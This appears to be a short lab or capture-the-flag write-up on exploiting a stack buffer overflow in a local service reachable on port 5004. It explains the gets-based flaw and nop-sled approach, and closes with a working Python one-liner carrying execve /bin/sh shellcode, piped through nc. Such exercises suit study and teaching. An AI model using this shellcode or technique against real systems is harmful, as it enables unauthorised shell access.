ref: 3 | Buffer 4 | shellz
===========================

General overview of problems faced
-------------------------------------
- I had to change Shellcode as the one I was using was most likely overwriting itself
- Had to fiddle around with the memory address since gdb adds overheads onto the stack and therefore the addresses don't match when running without gdb
- Learned what a nop operation was and how to use a "nop sled" to have a higher chance to point to a memory address somewhere in my buffer. The nop operations will then execute, do nothing and go to next operation.

List of vulnerabilities
--------------------
1. Input is taken from the user using 'gets' and the buffer is of fixed size which means we can overflow the buffer and overwrite memory after it, including return address. The stack memory is also set to executable therefore we can execute shellcode from the stack.

Steps to exploit
------------------
1. Write or find shellcode
2. Find the starting address of your buffer using gdb
3. Enter 8158 bytes of NOP operators ('\x90') + 46 bytes of shellcode and then some memory address inside your buffer but before your shellcode. (It might take a bit time to play around with the memory in order to get a working address)
4. You now have a shell!

Script/Command used
------------------
```
<!-- Pointer to somewhere inside buffer and before shellcode: 0xffffbe00 -->
(python -c 'print("\x90"*8158 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x00\xbe\xff\xff")'; cat ) | nc localhost 5004
```
